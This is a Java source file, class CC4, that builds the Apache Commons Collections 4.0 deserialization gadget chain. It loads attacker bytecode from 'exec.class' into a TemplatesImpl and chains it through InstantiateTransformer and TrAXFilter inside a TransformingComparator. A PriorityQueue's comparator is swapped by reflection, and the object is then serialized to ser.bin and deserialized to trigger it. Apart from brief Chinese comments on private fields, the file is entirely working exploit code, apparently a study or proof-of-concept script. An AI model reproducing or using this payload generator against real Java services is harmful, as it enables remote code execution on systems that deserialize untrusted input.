import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        /**
         * commons-collections-4.0
         * InstantiateTransformer
         * PriorityQueue
         */
        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true); // 都是 private 变量
        nameField.set(templates,"aaa");
        Field bytecodeField = c.getDeclaredField("_bytecodes"); // bytecode 是个二维数组
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("target\\classes\\exec.class"));
        byte[][] codes = { code };
        bytecodeField.set(templates,codes);
        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue((o1, o2) -> 0);
        priorityQueue.add("a");
        priorityQueue.add("b");
        Class cls = PriorityQueue.class;
        Field comparatorField = cls.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue,transformingComparator);
        serialize(priorityQueue);
        unserialize("ser.bin");


    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
